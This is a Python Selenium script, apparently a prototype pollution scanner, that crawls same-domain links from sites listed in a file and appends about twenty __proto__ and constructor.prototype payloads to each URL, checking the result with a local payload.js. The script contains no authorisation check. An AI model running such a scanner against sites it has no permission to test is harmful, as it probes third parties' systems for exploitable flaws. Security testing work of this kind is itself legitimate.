from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions
from selenium.common.exceptions import NoSuchElementException
import time
import colorama
from colorama import Fore, Style, Back

chrome_options = Options()
chrome_options.add_argument("--window-size=1920x1080")
chrome_options.add_argument("--disable-infobars")
chrome_options.add_argument("--disable-dev-shm-usage") 
chrome_options.add_argument("disable-infobars")
chrome_options.add_argument("--no-sandbox") 
chrome_options.add_argument("--incognito")
chrome_options.add_argument("--auto-open-devtools-for-tabs");
chrome_options.add_argument('--headless')
chrome_driver = "./chromedriver"

with open('url.txt') as my_file:
	testsite_array = my_file.readlines()

target = []
new_target = []
for _x in testsite_array:

	try:

		driver = webdriver.Chrome(options=chrome_options, executable_path=chrome_driver)
		driver.get("https://"+_x)
		domain = _x
		elems = driver.find_elements_by_xpath("//a[@href]")
		
		for elem in elems:
			target.append(elem.get_attribute("href"))

		for _x in target:
			if domain in _x:
				print(_x)
				new_target.append(_x)

	except Exception as e:
		print("Error : " + str(e))
		time.sleep(5)

print(new_target)


payloads = [
	"__proto__.jspanda=testpayload",
	"__proto__[jspanda]=testpayload",
	"constructor.prototype.jspanda=testpayload",		
	"constructor.[prototype].[jspanda]=testpayload",
	"?__proto__.jspanda=testpayload",
	"?__proto__[jspanda]=testpayload",
	"#__proto__.jspanda=testpayload",
	"#__proto__[jspanda]=testpayload",
	"?constructor.prototype.jspanda=testpayload",		
	"#constructor.prototype.jspanda=testpayload",
	"?constructor[prototype][jspanda]=testpayload",
	"#constructor[prototype][jspanda]=testpayload",
	"/?__proto__.jspanda=testpayload",
	"/?__proto__[jspanda]=testpayload",
	"/#__proto__.jspanda=testpayload",
	"/#__proto__[jspanda]=testpayload",
	"/?constructor.prototype.jspanda=testpayload",		
	"/#constructor.prototype.jspanda=testpayload",
	"/?constructor[prototype][jspanda]=testpayload",
	"/#constructor[prototype][jspanda]=testpayload"
	]	


driver = webdriver.Chrome(options=chrome_options, executable_path=chrome_driver)

result = []
for _x in new_target:

	for payload in payloads:

		try:
			driver.execute_script("window.open('');")
			driver.window_handles[1]
			driver.get(_x+payload)
			driver.maximize_window()
			print("+-+-+-+-+ Panda is Rolling +-+-+-+-+")
			info = driver.execute_script(open("./payload.js").read())

			if "happy" in str(info):
				print(Back.GREEN + _x+payload + "\n")
				print(Back.GREEN + "Status : " + str(info))
				print(Style.RESET_ALL)
				result.append(_x+payload)
			if "sad" in str(info):
				print(Back.RED + _x+payload + "\n")
				print(Back.RED + "Status : " + str(info))
				print(Style.RESET_ALL)

			driver.close()
			driver.switch_to.window(driver.window_handles[0])

		except Exception as e:
			print("Error : " + str(e))
			continue

driver.quit()		

print("+-+-+-+-+ Results +-+-+-+-+")
print(result)
